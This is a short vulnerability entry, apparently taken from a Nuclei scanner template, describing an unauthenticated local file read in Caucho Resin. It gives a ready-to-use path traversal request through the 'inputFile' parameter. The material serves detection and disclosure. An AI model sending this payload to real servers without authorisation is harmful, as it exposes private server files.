# Vulnerability: Caucho Resin LFR
**Classification:** RESIN
**Source:** Nuclei Template (`resin-inputfile-fileread.yaml`)

## Description
A vulnerability in Caucho Resin allows remote unauthenticated users to utilize the 'inputFile' variable to include the content of locally stored files and disclose their content.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
```

